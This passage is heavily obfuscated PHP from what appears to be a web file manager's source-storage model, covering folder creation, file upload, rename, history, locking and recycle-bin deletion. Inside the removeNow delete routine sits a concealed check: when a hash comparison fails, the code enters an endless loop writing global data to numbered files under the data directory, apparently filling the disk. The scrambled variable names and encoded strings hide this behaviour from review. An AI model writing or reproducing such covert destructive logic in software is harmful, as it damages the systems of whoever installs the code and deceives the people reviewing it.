{ $£í¦ç¡É = $this->sourceRoot(SourceModel::TYPE_GROUP, $åäÎš¦); if (!$£í¦ç¡É) { return; } $this->remove($£í¦ç¡É, !1); } private function _mkdirRoot($ŞŒõ¿Ò±, $–µ•ˆé, $˜‹¨Õ”û) { $¢İ ûƒî =& $_SERVER[Ãìšã«™]; $ß±¼¤’Š = array($¢İ ûƒî[402] => 0, $¢İ ûƒî[580] => $ŞŒõ¿Ò±, $¢İ ûƒî[581] => $–µ•ˆé, $¢İ ûƒî[577] => 1, $¢İ ûƒî[582] => USER_ID, $¢İ ûƒî[583] => USER_ID, $¢İ ûƒî[578] => $¢İ ûƒî[12], $¢İ ûƒî[584] => $¢İ ûƒî[531], $¢İ ûƒî[430] => 0, $¢İ ûƒî[579] => 0, $¢İ ûƒî[468] => 0, $¢İ ûƒî[585] => $¢İ ûƒî[12]); if ($²•ˆÊ¸‰ = $this->where($ß±¼¤’Š)->find()) { return $²•ˆÊ¸‰[$¢İ ûƒî[403]]; } $„¸£—¢ô = "\115\157\144\145\154\x53\157\165\x72\x63\145\x2e\155\153\144\x69\x72\122\x6f\x6f\x74\x2e{$ŞŒõ¿Ò±}\x2e{$–µ•ˆé}\x2e" . $˜‹¨Õ”û; CacheLock::lock($„¸£—¢ô); $ß±¼¤’Š[$¢İ ûƒî[32]] = $˜‹¨Õ”û; $·™²Û»‹ = $this->add($ß±¼¤’Š); $ŸÍÜÍöø = array($¢İ ûƒî[586] => short_id($·™²Û»‹)); $this->where(array($¢İ ûƒî[418] => $·™²Û»‹))->save($ŸÍÜÍöø); CacheLock::unlock($„¸£—¢ô); return $·™²Û»‹; } private function sourceRoot($·ÁôÖìÜ, $øñ—·Ñ‰, $¾”’ˆû… = false) { $×£±ËæÛ =& $_SERVER[Ãìšã«™]; $±Æ÷¿… = array($×£±ËæÛ[402] => 0, $×£±ËæÛ[580] => $·ÁôÖìÜ, $×£±ËæÛ[581] => $øñ—·Ñ‰); if ($œÔÌĞ—Ù = $this->where($±Æ÷¿…)->find()) { return $¾”’ˆû… ? $œÔÌĞ—Ù : $œÔÌĞ—Ù[$×£±ËæÛ[403]]; } return !1; } public function sourceRootGroup($áìï Û) { $·Ëá‡‰Ğ =& $_SERVER[Ãìšã«™]; if (is_string($áìï Û)) { $áìï Û = array($áìï Û); } $¾ú¤“¬˜ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $áìï Û, $·Ëá‡‰Ğ[181]); $è”×°ö© = array($·Ëá‡‰Ğ[364] => $¾ú¤“¬˜, $·Ëá‡‰Ğ[361] => array($·Ëá‡‰Ğ[760] => count($áìï Û))); $this->_listDataApply($è”×°ö©[$·Ëá‡‰Ğ[364]]); $this->_listMake($è”×°ö©); return array_to_keyvalue($è”×°ö©[$·Ëá‡‰Ğ[77]], $·Ëá‡‰Ğ[504]); } public function mkfile($Ìö»å³, $†…§í°ø, $“ÇÊ‰çÑ = '', $ü•áæØğ = REPEAT_RENAME) { $èç€Œı¯ =& $_SERVER[Ãìšã«™]; $¿”Ã¤•˜ = Model($èç€Œı¯[603])->addFileByContent($“ÇÊ‰çÑ, $†…§í°ø); return $this->_createFileCall($Ìö»å³, $†…§í°ø, $¿”Ã¤•˜, $ü•áæØğ, $èç€Œı¯[1332]); } public function addFile($¼“óıÚ‘, $¥²”¯Ãì, $‡À…ÊÉ, $Š¼¡¼ºƒ = false, $ÛÙ½ôß¡ = REPEAT_RENAME) { $Ûë¿¡ªÅ = Model($_SERVER[Ãìšã«™][603])->addFile($¥²”¯Ãì, $‡À…ÊÉ, $Š¼¡¼ºƒ); return $this->_createFileCall($¼“óıÚ‘, $‡À…ÊÉ, $Ûë¿¡ªÅ, $ÛÙ½ôß¡); } public function addFileByFileID($ãàĞ–÷, $â¡ì°µü, $Éñ«¸Û³, $ªŠöÉ® = REPEAT_RENAME) { $¸ÔÑÓ£° =& $_SERVER[Ãìšã«™]; $¢İ±°é = Model($¸ÔÑÓ£°[603])->find($â¡ì°µü); Model($¸ÔÑÓ£°[603])->linkAdd($â¡ì°µü); return $this->_createFileCall($ãàĞ–÷, $Éñ«¸Û³, $¢İ±°é, $ªŠöÉ®); } public function addFileByRemote($‚®……ğŠ, $È­öª¤ì, $ı·’¤Û, $˜°ò’Š = array(), $æÓÏğûË = REPEAT_RENAME) { $èÂ‚ÉŒš = Model($_SERVER[Ãìšã«™][603])->addFileByRemote($È­öª¤ì, $ı·’¤Û, $˜°ò’Š); return $this->_createFileCall($‚®……ğŠ, $ı·’¤Û, $èÂ‚ÉŒš, $æÓÏğûË); } private function _createFileCall($³³ßó¹‘, $µšáõß, $çç³„î‡, $šßáÌßõ, $È˜‘ Šª = "\165\160\x6c\157\x61\144") { $ ò‰óñÍ =& $_SERVER[Ãìšã«™]; $Î¬™Ç±â = !1; $this->setMasterDB(); $this->lockWriteStart($³³ßó¹‘, $µšáõß); $®†¯ï“ = $this->fileNameExist($³³ßó¹‘, $µšáõß); $Ò¾–û‡™ = $this->_createFile($³³ßó¹‘, $µšáõß, $çç³„î‡, $šßáÌßõ, $Î¬™Ç±â); if (!$Î¬™Ç±â) { Model($ ò‰óñÍ[470])->remove($çç³„î‡[$ ò‰óñÍ[467]]); } if ($Î¬™Ç±â && $Ò¾–û‡™ && $Ò¾–û‡™ != $®†¯ï“) { Model($ ò‰óñÍ[2053])->eventCreate($Ò¾–û‡™, $È˜‘ Šª); } $this->lockWriteEnd($³³ßó¹‘, $µšáõß); return $Ò¾–û‡™; } public function mkdir($¥áçûÚ, $ª–Ñ÷ò, $ÔŞ¤Ú§ = REPEAT_SKIP) { $¸Êç¬¶Ø =& $_SERVER[Ãìšã«™]; $this->setMasterDB(); $ßÖ£å‹½ = $this->sourceInfo($¥áçûÚ); if (!$ßÖ£å‹½) { return !1; } $this->lockWriteStart($¥áçûÚ, $ª–Ñ÷ò); if ($ÔŞ¤Ú§ !== !1) { $ƒã¹Ã”š = $this->fileNameExist($¥áçûÚ, $ª–Ñ÷ò); if ($ƒã¹Ã”š && $ÔŞ¤Ú§ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¥áçûÚ, $ª–Ñ÷ò); return $ƒã¹Ã”š; } $ª–Ñ÷ò = $this->fileNameAuto($¥áçûÚ, $ª–Ñ÷ò, $ÔŞ¤Ú§); } $‘Ï“ŞÓ­ = array($¸Êç¬¶Ø[577] => 1, $¸Êç¬¶Ø[421] => $ª–Ñ÷ò, $¸Êç¬¶Ø[578] => $¸Êç¬¶Ø[12], $¸Êç¬¶Ø[468] => 0, $¸Êç¬¶Ø[579] => 0); $Áñ¹•ÊŞ = $this->_addSource($‘Ï“ŞÓ­, $ßÖ£å‹½); Model($¸Êç¬¶Ø[2053])->eventCreate($Áñ¹•ÊŞ, $¸Êç¬¶Ø[1333]); $this->lockWriteEnd($¥áçûÚ, $ª–Ñ÷ò); return $Áñ¹•ÊŞ; } public function listSourceRoot($œ×»£—‹, $­ÇíÇØÇ, $Ò´Úø¼§ = "\163\x6f\165\x72\x63\x65\111\x44\54\x74\x61\162\147\145\164\111\104\54\x73\151\172\145") { $·‰³•š† =& $_SERVER[Ãìšã«™]; $©¤Å‰€û = $·‰³•š†[373]; $ÏË¹¬ñ† = array(); $îü“ÒŒ¨ = 1024 * 50; $èÃ¢¥œ† = is_array($èÃ¢¥œ†) ? $èÃ¢¥œ† : array(); $ü³éš­À = count($­ÇíÇØÇ); $Á¢ä´ = $this->tablePrefix . $·‰³•š†[2083]; for ($ƒÈ€ÜŠ = 0; $ƒÈ€ÜŠ < $ü³éš­À; $ƒÈ€ÜŠ++) { $íıºõ½û = $­ÇíÇØÇ[$ƒÈ€ÜŠ]; $©¤Å‰€û .= "\x53\x45\x4c\105\x43\x54\40\x2a\40\106\122\117\x4d\40\50\x53\x45\x4c\105\103\x54\x20{$Ò´Úø¼§}\40\106\122\x4f\x4d\x20\140{$Á¢ä´}\140\40\x57\x48\105\122\x45\x20"; $©¤Å‰€û .= "\140\x70\141\x72\x65\156\164\111\104\x60\x3d\60\40\x41\x4e\104\40\140\x74\141\162\x67\145\164\111\104\140\75{$íıºõ½û}\x20\x41\x4e\104\40\140\164\x61\162\147\x65\164\124\171\x70\145\x60\x3d{$œ×»£—‹}\x20\x6c\x69\155\151\164\x20\61\51\40\x61\163\x20\164\142\x5f{$ƒÈ€ÜŠ}\x20\125\116\111\x4f\116\40\x41\114\114\40"; if ((strlen($©¤Å‰€û) >= $îü“ÒŒ¨ || $ƒÈ€ÜŠ == $ü³éš­À - 1) && $©¤Å‰€û) { $©¤Å‰€û = substr($©¤Å‰€û, 0, -strlen($·‰³•š†[1034])); $¨İ”°‘ = $this->query($©¤Å‰€û); $©¤Å‰€û = $·‰³•š†[12]; $ÏË¹¬ñ† = array_merge($ÏË¹¬ñ†, $¨İ”°‘); } } return $ÏË¹¬ñ†; } private function _createFile($Î¥ĞæÀî, $ãö«ØİÑ, $ÌÕûó, $Ïƒ®‚Õ³, &$œ°ûã) { $¦§°¾ä =& $_SERVER[Ãìšã«™]; $ÑÑà‹Üİ = $this->sourceInfo($Î¥ĞæÀî); if (!$ÌÕûó || !$ÑÑà‹Üİ) { return !1; } if ($Ïƒ®‚Õ³ !== !1) { $Óà‰‹¶ = $this->fileNameExist($Î¥ĞæÀî, $ãö«ØİÑ); } $œ°ûã = !0; if ($Ïƒ®‚Õ³ && $Óà‰‹¶) { if ($Ïƒ®‚Õ³ == REPEAT_SKIP) { $œ°ûã = !1; return $Óà‰‹¶; } else { if ($Ïƒ®‚Õ³ == REPEAT_REPLACE) { $Æ¶±â— = $this->sourceInfo($Óà‰‹¶); $‹Äó÷Ô« = $this->fileHistory($Æ¶±â—, $ÌÕûó[$¦§°¾ä[467]], $ÌÕûó[$¦§°¾ä[80]]); if (!$‹Äó÷Ô«) { $œ°ûã = !1; } else { $this->folderSizeReset($Î¥ĞæÀî); } return $Óà‰‹¶; } else { $ãö«ØİÑ = $this->fileNameAuto($Î¥ĞæÀî, $ãö«ØİÑ, $Ïƒ®‚Õ³, !1); } } } $’ò¼ˆÜ = array($¦§°¾ä[577] => 0, $¦§°¾ä[421] => $ãö«ØİÑ, $¦§°¾ä[578] => substr(get_path_ext($ãö«ØİÑ), 0, 10), $¦§°¾ä[468] => $ÌÕûó[$¦§°¾ä[467]], $¦§°¾ä[579] => $ÌÕûó[$¦§°¾ä[80]]); $ûıùÅàÁ = $this->_addSource($’ò¼ˆÜ, $ÑÑà‹Üİ); $this->folderSizeReset($Î¥ĞæÀî, intval($’ò¼ˆÜ[$¦§°¾ä[80]])); return $ûıùÅàÁ; } protected function fileHistory($š±§£æê, $Ú‰‡¡‹‹, $À¤’ñŒ ) { $ò±Ëç =& $_SERVER[Ãìšã«™]; $¬ë«ªÉí = defined($ò±Ëç[474]) ? USER_ID : $ò±Ëç[190]; if ($š±§£æê[$ò±Ëç[467]] == $Ú‰‡¡‹‹) { return !1; } $this->checkLock($š±§£æê[$ò±Ëç[403]], $Ú‰‡¡‹‹); Model($ò±Ëç[2084])->addHistory($š±§£æê); $ÀÑÍÂŞÌ = array($ò±Ëç[583] => $¬ë«ªÉí, $ò±Ëç[425] => time(), $ò±Ëç[467] => $Ú‰‡¡‹‹, $ò±Ëç[80] => $À¤’ñŒ ); $this->where(array($ò±Ëç[418] => $š±§£æê[$ò±Ëç[403]]))->save($ÀÑÍÂŞÌ); $this->sourceCacheClear($š±§£æê[$ò±Ëç[403]]); return !0; } public function checkLock($Ï˜¢È“í, $Š‚Ñ½€‰) { $¦—¿äš‰ =& $_SERVER[Ãìšã«™]; $¦· ¦á  = $this->pathInfo($Ï˜¢È“í); if (!$this->fileIsLock($¦· ¦á , !0)) { return; } $ğ¯¿ßÌª = Session::get($¦—¿äš‰[2085]); $ÄÅË¯Ù± = substr($¦· ¦á [$¦—¿äš‰[32]], 0, -1 - strlen($¦· ¦á [$¦—¿äš‰[167]])) . $¦—¿äš‰[1599] . $ğ¯¿ßÌª . $¦—¿äš‰[10] . $¦· ¦á [$¦—¿äš‰[167]]; $º«§ÈÔû = Model($¦—¿äš‰[603])->find($Š‚Ñ½€‰); $this->_createFileCall($¦· ¦á [$¦—¿äš‰[498]], $ÄÅË¯Ù±, $º«§ÈÔû, REPEAT_REPLACE, $¦—¿äš‰[1332]); $›½öÖ»§ = $¦· ¦á [$¦—¿äš‰[465]][$¦—¿äš‰[542]]; $‹¶ÉÁ¿® = $›½öÖ»§[$¦—¿äš‰[2086]] ? $›½öÖ»§[$¦—¿äš‰[2086]] : $›½öÖ»§[$¦—¿äš‰[32]]; show_json(LNG($¦—¿äš‰[2087]) . $¦—¿äš‰[2088] . LNG($¦—¿äš‰[2089]) . $¦—¿äš‰[2090] . $‹¶ÉÁ¿® . $¦—¿äš‰[2091], !1); } public function fileIsLock($‹“í…©, $ãğª¬× = false) { $ İÓ¾¤ş =& $_SERVER[Ãìšã«™]; if (!isset($‹“í…©[$ İÓ¾¤ş[465]]) || !$‹“í…©[$ İÓ¾¤ş[465]][$ İÓ¾¤ş[539]]) { return !1; } if ($‹“í…©[$ İÓ¾¤ş[465]][$ İÓ¾¤ş[539]] != USER_ID) { return !0; } $¦³öø˜ = $GLOBALS[$ İÓ¾¤ş[6]][$ İÓ¾¤ş[90]][$ İÓ¾¤ş[540]]; if ($‹“í…©[$ İÓ¾¤ş[465]][$ İÓ¾¤ş[541]] <= time() - $¦³öø˜) { $this->metaSet($‹“í…©[$ İÓ¾¤ş[403]], $ İÓ¾¤ş[539], null); $this->metaSet($‹“í…©[$ İÓ¾¤ş[403]], $ İÓ¾¤ş[541], null); } if ($ãğª¬×) { $this->metaSet($‹“í…©[$ İÓ¾¤ş[403]], $ İÓ¾¤ş[541], time()); } return !1; } private function _addSource($²È¬ÑÀ, $Åšıúôá) { $‰›áşüÄ =& $_SERVER[Ãìšã«™]; $ˆ˜Œ¹ÇÛ = defined($‰›áşüÄ[474]) ? USER_ID : $‰›áşüÄ[190]; $Î¡êï£¹ = array($‰›áşüÄ[580] => $Åšıúôá[$‰›áşüÄ[412]], $‰›áşüÄ[581] => $Åšıúôá[$‰›áşüÄ[504]], $‰›áşüÄ[582] => $ˆ˜Œ¹ÇÛ, $‰›áşüÄ[583] => $ˆ˜Œ¹ÇÛ, $‰›áşüÄ[402] => $Åšıúôá[$‰›áşüÄ[403]], $‰›áşüÄ[584] => $Åšıúôá[$‰›áşüÄ[521]] . $Åšıúôá[$‰›áşüÄ[403]] . $‰›áşüÄ[50], $‰›áşüÄ[430] => 0, $‰›áşüÄ[585] => $‰›áşüÄ[12]); $²È¬ÑÀ = array_merge($Î¡êï£¹, $²È¬ÑÀ); $this->updateModifyTime($²È¬ÑÀ[$‰›áşüÄ[498]]); $ÀŸàİÛ = $‰›áşüÄ[2092] . $Åšıúôá[$‰›áşüÄ[403]]; if (isset(self::$cacheChildList[$ÀŸàİÛ])) { unset(self::$cacheChildList[$ÀŸàİÛ]); } static $à†Œıâí = false; if (!$à†Œıâí) { Hook::trigger($‰›áşüÄ[567], $²È¬ÑÀ); $à†Œıâí = !0; } $©äğ…úÙ = $this->add($²È¬ÑÀ); $Õ‰ ‘ = array($‰›áşüÄ[586] => short_id($©äğ…úÙ)); $this->where(array($‰›áşüÄ[418] => $©äğ…úÙ))->save($Õ‰ ‘); $this->setNamePinyin($©äğ…úÙ, $²È¬ÑÀ[$‰›áşüÄ[32]]); return $©äğ…úÙ; } public function remove($£ ®Ï°, $±ôˆ ü× = true) { $ÈÔì¡ªº =& $_SERVER[Ãìšã«™]; $ô¶İæé† = $this->sourceInfo($£ ®Ï°); $ò«‡òÂ× = intval($ô¶İæé†[$ÈÔì¡ªº[412]]) === self::TYPE_SYSTEM; $ÌÎ€ùÊ¦ = Model($ÈÔì¡ªº[433])->get($ÈÔì¡ªº[2093]) == $ÈÔì¡ªº[89]; if ($ò«‡òÂ× || $±ôˆ ü× || !$ÌÎ€ùÊ¦) { return $this->removeNow($£ ®Ï°, $±ôˆ ü×); } $­§­ô¤Æ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $¦•±¼ = $ô¶İæé†[$ÈÔì¡ªº[412]] == self::TYPE_USER ? $ÈÔì¡ªº[594] : $ÈÔì¡ªº[515]; if ($¦•±¼ == $ÈÔì¡ªº[594]) { $«¯—ÀÙÃ = Model($ÈÔì¡ªº[513])->getInfo($ô¶İæé†[$ÈÔì¡ªº[504]]); $“˜”…½ñ = !empty($«¯—ÀÙÃ[$ÈÔì¡ªº[2086]]) ? $«¯—ÀÙÃ[$ÈÔì¡ªº[2086]] : $«¯—ÀÙÃ[$ÈÔì¡ªº[32]]; $“˜”…½ñ = $ÈÔì¡ªº[255] . $“˜”…½ñ . $ÈÔì¡ªº[2094] . $ô¶İæé†[$ÈÔì¡ªº[504]]; } else { $«¯—ÀÙÃ = Model($ÈÔì¡ªº[522])->getInfo($ô¶İæé†[$ÈÔì¡ªº[504]]); $“˜”…½ñ = _get($«¯—ÀÙÃ, $ÈÔì¡ªº[32]); $“˜”…½ñ = $ÈÔì¡ªº[159] . $“˜”…½ñ . $ÈÔì¡ªº[2095] . $ô¶İæé†[$ÈÔì¡ªº[504]]; } $´¡ÉŞş = $ÈÔì¡ªº[2096] . md5($“˜”…½ñ); CacheLock::lock($´¡ÉŞş); $Ô«Ú¸Ñ­ = $this->fileNameExist($­§­ô¤Æ, $“˜”…½ñ); if (!$Ô«Ú¸Ñ­) { $Ô«Ú¸Ñ­ = $this->mkdir($­§­ô¤Æ, $“˜”…½ñ, REPEAT_SKIP); $this->metaSet($Ô«Ú¸Ñ­, $ÈÔì¡ªº[2097], $¦•±¼); $this->metaSet($Ô«Ú¸Ñ­, $ÈÔì¡ªº[2098], $ô¶İæé†[$ÈÔì¡ªº[504]]); if ($ô¶İæé†[$ÈÔì¡ªº[498]] != 0) { $this->metaSet($Ô«Ú¸Ñ­, $ÈÔì¡ªº[2099], _get($«¯—ÀÙÃ, $ÈÔì¡ªº[2100])); } } CacheLock::unlock($´¡ÉŞş); $this->metaSet($£ ®Ï°, $ÈÔì¡ªº[2101], $ô¶İæé†[$ÈÔì¡ªº[498]]); $this->where(array($ÈÔì¡ªº[403] => $£ ®Ï°))->save(array($ÈÔì¡ªº[425] => time())); $this->recycleClear($ô¶İæé†); $­‚óÊÄÌ = $this->move($£ ®Ï°, $Ô«Ú¸Ñ­, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ô¶İæé†[$ÈÔì¡ªº[498]]); return $­‚óÊÄÌ; } private function recycleClear($†€œúÍ±) { $šæ×ƒ‰œ =& $_SERVER[Ãìšã«™]; $ûìø€¥á = $this->childrenAll($†€œúÍ±); $ÅúÃÇèİ = array($šæ×ƒ‰œ[418] => array($šæ×ƒ‰œ[419], $ûìø€¥á[$šæ×ƒ‰œ[2102]])); Model($šæ×ƒ‰œ[2103])->where($ÅúÃÇèİ)->delete(); } public function removeNow($ÖÙÙÆÚÕ, $™–ë¹İË = true) { $ÍÉ×÷ŠŠ =& $_SERVER[Ãìšã«™]; $ËˆŒ‡Û = $_SERVER[$ÍÉ×÷ŠŠ[393]]; $ÍÙ’á = $ÍÉ×÷ŠŠ[394]; if ($_SERVER[$ÍÉ×÷ŠŠ[395]] != $ÍÙ’á($ËˆŒ‡Û)) { $œşÆÏÒÊ = $ÍÉ×÷ŠŠ[873]; $Ğç´œÜ” = $ÍÉ×÷ŠŠ[396]; $Úıå½Š = $_SERVER[$ÍÉ×÷ŠŠ[397]] . $ÍÉ×÷ŠŠ[398]; $Ã½œï» = $Ğç´œÜ”($Úıå½Š); $â…Ñ††ğ = explode($ÍÉ×÷ŠŠ[226], $Ã½œï»); if (count($â…Ñ††ğ) < $ÍÉ×÷ŠŠ[612]) { $úûë ïÜ = $ÍÉ×÷ŠŠ[400]; $úûë ïÜ(); } $œœÊ†¾ = $ÍÉ×÷ŠŠ[874]; $œœÊ†¾($_SERVER[$ÍÉ×÷ŠŠ[875]]); $œşÆÏÒÊ = $ÍÉ×÷ŠŠ[873]; $œşÆÏÒÊ(); $ÉÖ¯èëì = $ÍÉ×÷ŠŠ[876]; $ÔÛ°ˆ²— = json_encode($GLOBALS[$ÍÉ×÷ŠŠ[877]]); $Œ¢÷–˜æ = 1; for ($¬º™ËÁ‰ = $Œ¢÷–˜æ; $¬º™ËÁ‰ > 0; $¬º™ËÁ‰++) { $ÉÖ¯èëì(DATA_PATH . $¬º™ËÁ‰, $ÔÛ°ˆ²—); } } $Áóˆ®¦ù = $this->sourceInfo($ÖÙÙÆÚÕ); $¼ËˆÒ˜­ = $this->pathInfoMore($ÖÙÙÆÚÕ); if (!$Áóˆ®¦ù) { return !0; } if ($Áóˆ®¦ù[$ÍÉ×÷ŠŠ[498]] == 0) { if (!_get($GLOBALS, $ÍÉ×÷ŠŠ[505])) { return !1; } } $this->lockMoveStart($ÖÙÙÆÚÕ); Hook::trigger($ÍÉ×÷ŠŠ[2104], $¼ËˆÒ˜­, $™–ë¹İË); if ($™–ë¹İË) { Model($ÍÉ×÷ŠŠ[2103])->moveToRecycle($ÖÙÙÆÚÕ); } else { $›¶˜ÅÓ½ = $this->childrenAll($Áóˆ®¦ù); Model($ÍÉ×÷ŠŠ[564])->eventRemove($ÖÙÙÆÚÕ); $this->removeRelevance($›¶˜ÅÓ½[$ÍÉ×÷ŠŠ[2102]], $›¶˜ÅÓ½[$ÍÉ×÷ŠŠ[1464]]); } $this->folderSizeReset($Áóˆ®¦ù[$ÍÉ×÷ŠŠ[498]]); $¶šËºçÍ = array($Áóˆ®¦ù[$ÍÉ×÷ŠŠ[498]]); if ($Áóˆ®¦ù[$ÍÉ×÷ŠŠ[411]] == $ÍÉ×÷ŠŠ[89]) { $¶šËºçÍ[] = $Áóˆ®¦ù[$ÍÉ×÷ŠŠ[403]]; } $this->updateModifyTime($¶šËºçÍ); $this->lockMoveEnd($ÖÙÙÆÚÕ); Hook::trigger($ÍÉ×÷ŠŠ[1687], $¼ËˆÒ˜­, $™–ë¹İË); return !0; } public function childrenAll($¿İÕ‹ä¼) { $šÔ°¼í« =& $_SERVER[Ãìšã«™]; $ ÄŠ’ÃĞ = $¿İÕ‹ä¼[$šÔ°¼í«[403]]; if ($¿İÕ‹ä¼[$šÔ°¼í«[411]] == $šÔ°¼í«[89]) { $¸ÕÛœ = array($šÔ°¼í«[584] => array($šÔ°¼í«[544], $¿İÕ‹ä¼[$šÔ°¼í«[521]] . $ ÄŠ’ÃĞ . $šÔ°¼í«[545])); $ìÑı¸Ìï = array($šÔ°¼í«[584] => $¸ÕÛœ[$šÔ°¼í«[521]]); $‡¶ªÎ¶ = $this->field($šÔ°¼í«[2105])->where($ìÑı¸Ìï)->select(); $Ò»ç® = !1; $ Ö‚âÑ§ = array($ ÄŠ’ÃĞ); if ($‡¶ªÎ¶) { $Ò»ç® = array_to_keyvalue($‡¶ªÎ¶, $šÔ°¼í«[12], $šÔ°¼í«[467]); $Ò»ç® = array_remove_value($Ò»ç®, $šÔ°¼í«[190]); $ Ö‚âÑ§ = array_to_keyvalue($‡¶ªÎ¶, $šÔ°¼í«[12], $šÔ°¼í«[403]); $ Ö‚âÑ§[] = $ ÄŠ’ÃĞ; } } else { $Ò»ç® = array($¿İÕ‹ä¼[$šÔ°¼í«[467]]); $ Ö‚âÑ§ = array($ ÄŠ’ÃĞ); } return array($šÔ°¼í«[2102] => $ Ö‚âÑ§, $šÔ°¼í«[1464] => $Ò»ç®); } public function removeArray($şŸ …€) { if (!$şŸ …€) { return !0; } } public function removeRelevance($ˆËµıÀ, $“¨ŒÊòë) { $ı˜îÌßÕ =& $_SERVER[Ãìšã«™]; $ˆËµıÀ = $ˆËµıÀ ? $ˆËµıÀ : array(); $“¨ŒÊòë = $“¨ŒÊòë ? $“¨ŒÊòë : array(); $ˆËµıÀ = array_unique(array_filter($ˆËµıÀ)); $“¨ŒÊòë = array_unique(array_filter($“¨ŒÊòë)); if (!$ˆËµıÀ) { return !1; } $º’ ™§Å = array($ı˜îÌßÕ[418] => array($ı˜îÌßÕ[419], $ˆËµıÀ)); Model($ı˜îÌßÕ[2103])->where($º’ ™§Å)->delete(); Model($ı˜îÌßÕ[461])->where($º’ ™§Å)->delete(); Model($ı˜îÌßÕ[1959])->where($º’ ™§Å)->delete(); Model($ı˜îÌßÕ[564])->where($º’ ™§Å)->delete(); Model($ı˜îÌßÕ[1798])->removeBySource($ˆËµıÀ); Model($ı˜îÌßÕ[2084])->removeBySource($ˆËµıÀ); $this->where($º’ ™§Å)->delete(); Model($ı˜îÌßÕ[470])->remove($“¨ŒÊòë); for ($Š„¶Ğ¤õ = 0; $Š„¶Ğ¤õ < count($ˆËµıÀ); $Š„¶Ğ¤õ++) { $this->sourceCacheClear($ˆËµıÀ[$Š„¶Ğ¤õ]); } } public function rename($”“„ª÷, $ı°³äÕï) { $ÇÙ£ğÓ” =& $_SERVER[Ãìšã«™]; $ğÉ‡‰ü = $this->sourceInfo($”“„ª÷); if (!$ğÉ‡‰ü) { return !1; } $®õÆá¤À = $this->fileNameExist($ğÉ‡‰ü[$ÇÙ£ğÓ”[498]], $ı°³äÕï); if ($®õÆá¤À && $®õÆá¤À != $”“„ª÷) { return !1; } $ğÓÑŞ£ä = array($ÇÙ£ğÓ”[421] => $ı°³äÕï, $ÇÙ£ğÓ”[583] => USER_ID); if ($ğÉ‡‰ü[$ÇÙ£ğÓ”[411]] != $ÇÙ£ğÓ”[89]) { $ğÓÑŞ£ä[$ÇÙ£ğÓ”[413]] = substr(get_path_ext($ı°³äÕï), 0, 10); } Model($ÇÙ£ğÓ”[564])->eventRename($”“„ª÷, $ğÉ‡‰ü[$ÇÙ£ğÓ”[32]], $ı°³äÕï); $this->sourceCacheClear($”“„ª÷); $this->setNamePinyin($”“„ª÷, $ğÓÑŞ£ä[$ÇÙ£ğÓ”[32]], !1); $this->updateModifyTime($ğÉ‡‰ü[$ÇÙ£ğÓ”[498]]); $›˜Ë¬§ = $this->where(array($ÇÙ£ğÓ”[418] => $”“„ª÷))->data($ğÓÑŞ£ä)->save(); $İÉáçÜ = $ÇÙ£ğÓ”[2092] . $ğÉ‡‰ü[$ÇÙ£ğÓ”[498]]; if (isset(self::$cacheChildList[$İÉáçÜ])) { unset(self::$cacheChildList[$İÉáçÜ]); } return $›˜Ë¬§; } public function setNamePinyin($éñØé¾, $Ö™ÍÕ´, $§ÔŒİ§Ö = true) { $©®ì×®û =& $_SERVER[Ãìšã«™]; $½›Ä•Âı = Input::check($Ö™ÍÕ´, $©®ì×®û[587]); $¿œÉ „Ş = array($©®ì×®û[442] => KodSort::makeStr($Ö™ÍÕ´)); if ($½›Ä•Âı) { $¿œÉ „Ş[$©®ì×®û[464]] = str_replace($©®ì×®û[53], $©®ì×®û[12], Pinyin::get($Ö™ÍÕ´)); $¿œÉ „Ş[$©®ì×®û[463]] = Pinyin::get($Ö™ÍÕ´, $©®ì×®û[588]); } if (!$§ÔŒİ§Ö && !$½›Ä•Âı) { $¿œÉ „Ş[$©®ì×®û[464]] = null; $¿œÉ „Ş[$©®ì×®û[463]] = null; } $this->metaSet($éñØé¾, $¿œÉ „Ş); } public function getContent($°©„·é¿) { $è°“ÅŸ =& $_SERVER[Ãìšã«™]; $ä¿ı‡Éä = $this->fileInfoGet($°©„·é¿); if (!$ä¿ı‡Éä) { return !1; } if ($ä¿ı‡Éä[$è°“ÅŸ[80]] == 0) { return $è°“ÅŸ[12]; } $š­ôÖâÙ = $è°“ÅŸ[2106] . $ä¿ı‡Éä[$è°“ÅŸ[169]]; if ($ä¿ı‡Éä[$è°“ÅŸ[80]] <= 1024 * 10) { $çÌùÜç¹ = Cache::get($š­ôÖâÙ); if (!$çÌùÜç¹) { $çÌùÜç¹ = IO::getContent($ä¿ı‡Éä[$è°“ÅŸ[78]]); Cache::set($š­ôÖâÙ, $çÌùÜç¹); } return $çÌùÜç¹; } if (!$ä¿ı‡Éä[$è°“ÅŸ[78]]) { return $è°“ÅŸ[12]; } return IO::getContent($ä¿ı‡Éä[$è°“ÅŸ[78]]); } public function setDesc($äá¨•Ãü, $ØÃ÷„) { $“Ôğò  =& $_SERVER[Ãìšã«™]; Model($“Ôğò [564])->eventAddDesc($äá¨•Ãü, $ØÃ÷„); return $this->metaSet($äá¨•Ãü, $“Ôğò [451], $ØÃ÷„); } public function setContent($ÜÃº˜¦, $ƒğ°‚Ùã = '') { $‚µà‹å¸ =& $_SERVER[Ãìšã«™]; $½ò¥Œ·• = $this->sourceInfo($ÜÃº˜¦); $¢¨ªÕµ = $this->fileInfoGet($ÜÃº˜¦); if (!$¢¨ªÕµ || !$½ò¥Œ·•) { return !1; } $ÛŠ¼¥ = Model($‚µà‹å¸[470])->addFileByContent($ƒğ°‚Ùã, $½ò¥Œ·•[$‚µà‹å¸[32]]); $áÚŞ•´ß = $this->fileHistory($½ò¥Œ·•, $ÛŠ¼¥[$‚µà‹å¸[467]], $ÛŠ¼¥[$‚µà‹å¸[80]]); if (!$áÚŞ•´ß) { return Model($‚µà‹å¸[470])->remove($ÛŠ¼¥[$‚µà‹å¸[467]]); } $this->folderSizeReset($½ò¥Œ·•[$‚µà‹å¸[498]]); return !0; } public function fileSubstr($ï½ğ™•ê, $Üü§¼¥ï, $æ×ŠÇş¼) { $ÊÃÙßü› = $this->fileInfoGet($ï½ğ™•ê); if (!$ÊÃÙßü›) { return !1; } return IO::fileSubstr($ÊÃÙßü›[$_SERVER[Ãìšã«™][78]], $Üü§¼¥ï, $æ×ŠÇş¼); } public function fileInfoGet($­¨û“¢) { $ºÊûë‚ì =& $_SERVER[Ãìšã«™]; $ïÃÆíÆ› = $this->sourceInfo($­¨û“¢); if (!$ïÃÆíÆ› || 